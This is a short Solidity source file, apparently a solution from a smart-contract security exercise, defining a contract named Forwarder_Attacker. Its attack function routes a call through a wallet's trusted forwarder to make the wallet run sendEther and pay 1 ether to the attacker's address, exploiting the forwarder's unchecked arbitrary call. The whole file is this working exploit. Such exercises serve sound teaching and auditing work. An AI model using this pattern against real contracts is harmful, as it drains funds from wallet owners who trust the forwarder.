// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import {Address} from "@openzeppelin/contracts/utils/Address.sol";
import {ERC1155Holder} from "@openzeppelin/contracts/token/ERC1155/utils/ERC1155Holder.sol";
import {Forwarder, Wallet} from "./Forwarder.sol";

contract Forwarder_Attacker {
    using Address for address;

    address payable public attacker;

    constructor(address payable _attacker) {
        attacker = _attacker;
    }

    function attack(Wallet wallet) public {
        Forwarder forwarder = Forwarder(wallet.forwarder());
        forwarder.functionCall(address(wallet), abi.encodeCall(Wallet.sendEther, (attacker, 1 ether)));
    }
}
